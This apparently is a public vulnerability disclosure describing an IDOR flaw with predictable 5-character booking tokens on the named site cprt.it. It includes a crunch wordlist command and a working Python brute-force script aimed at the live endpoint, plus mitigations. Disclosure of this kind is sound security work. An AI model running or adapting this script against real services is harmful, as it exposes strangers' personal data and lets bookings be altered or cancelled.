# Insecure Direct Object Reference (IDOR) via Weak Token Generation in cprt.it

## 📄 Summary
A vulnerability in the booking management endpoint of `cprt.it` allows unauthenticated attackers to access, modify, or delete the reservations of other users. The system generates highly predictable booking tokens (5-character lowercase alphanumeric strings) and lacks rate-limiting mechanisms, making it trivial to discover valid tokens via brute-force attacks.

## 🎯 Vulnerability Details
- **Vulnerability Type:** Insecure Direct Object Reference (IDOR) / Broken Access Control
- **CWE Classification:** - CWE-330: Use of Insufficiently Random Values
  - CWE-307: Improper Restriction of Excessive Authentication Attempts
- **Affected Endpoint:** `https://cprt.it/{token}`

### Description
The application uses a short, 5-character string to uniquely identify each booking. The token space is extremely small (limited to lowercase letters and numbers, significantly reducing entropy). Furthermore, the endpoint does not implement adequate anti-automation protections, such as Rate Limiting, CAPTCHA, or temporary IP bans.

Once a valid token is found, the attacker is automatically redirected to a session containing sensitive Personally Identifiable Information (PII) and features that allow them to alter the booking state.

## 💥 Impact
Successful exploitation leads to a complete compromise of the booking data, affecting both Confidentiality and Integrity:
- **PII Disclosure:** Attackers can view sensitive data belonging to victims, including full names, email addresses, and phone numbers.
- **Unauthorized Modification/Deletion:** Attackers can cancel or alter the details of the booking without requiring any further authentication.

## 🔬 Proof of Concept (PoC)

### 1. Generating the Wordlist
Due to the token consisting of 5 characters (strictly lowercase alphanumeric), the key space can be easily generated to optimize the brute-forcing process.
```bash
crunch 5 5 abcdefghijklmnopqrstuvwxyz0123456789 -o wordlist.txt
````

### 2\. Exploitation Script

The following Python script automates the brute-force process. It iterates through the wordlist, sends HTTP requests to the endpoint, and checks the HTML response for a specific element (`<a id="lnkModifica"`) to confirm a valid booking token.

```python
import requests
import sys

def check_token(base_url, token):
    url = f"{base_url}/{token}"
    try:
        # Using timeout to prevent hanging requests
        response = requests.get(url, allow_redirects=True, timeout=5)
        print(f"\rTesting token: {token} - Status: {response.status_code}    ", end='', flush=True)
        
        # Checking for the modification button to verify a successful hit
        if response.status_code == 200:
            if '<a id="lnkModifica"' in response.text:
                print(f"\n[+] Valid token found! Link: {response.url}")
                
    except requests.RequestException as e:
        print(f"\n[-] Error requesting token {token}: {e}")

def main():
    base_url = "[https://cprt.it](https://cprt.it)"
    wordlist_file = "wordlist2.txt"
    
    print(f"[*] Starting brute-force attack on {base_url}...\n")
    
    try:
        with open(wordlist_file, "r") as f:
            for line in f:
                token = line.strip()
                check_token(base_url, token)
    except FileNotFoundError:
        print(f"[-] Wordlist file '{wordlist_file}' not found. Please generate it first.")
        
    print("\n[*] Scan completed.")

if __name__ == "__main__":
    main()
```

## 🛡️ Recommended Mitigation

To properly secure the endpoint, the following steps are highly recommended:

1.  **Increase Token Entropy:** Replace the 5-character token with a Cryptographically Secure Pseudo-Random Number Generator (CSPRNG) value, such as a UUIDv4 (128-bit).
2.  **Implement Rate Limiting:** Introduce strict rate limiting on the `/{token}` endpoint to block IP addresses making excessive requests within a short timeframe (e.g., returning `HTTP 429 Too Many Requests`).
3.  **Strengthen Authentication:** Require a secondary piece of information to access sensitive booking details (e.g., Token + Associated Email address, or an OTP sent via SMS).
4.  **Monitoring:** Implement logging and alerting for anomalous traffic spikes targeting the reservation endpoints.

## 📸 Visual Evidence

  - **Terminal Output (Successful Brute-force):**

<img width="1462" height="443" alt="Terminal Output" src="https://github.com/user-attachments/assets/f4454505-e87b-4649-b3e4-3131a898fe6c" />



  - **Browser Screenshots (PII Exposure and Modification Access):**

<img width="1746" height="1081" alt="ProvaGrafica" src="https://github.com/user-attachments/assets/c92172ce-343f-43e6-9c86-cb991971cdea" />
<img width="1733" height="1073" alt="ProvaGrafica2" src="https://github.com/user-attachments/assets/9889be8d-f36f-479a-b036-2cd1916fd257" />
<img width="1893" height="1008" alt="modifica" src="https://github.com/user-attachments/assets/5ba9386b-0d02-4360-854a-385fad080c67" />
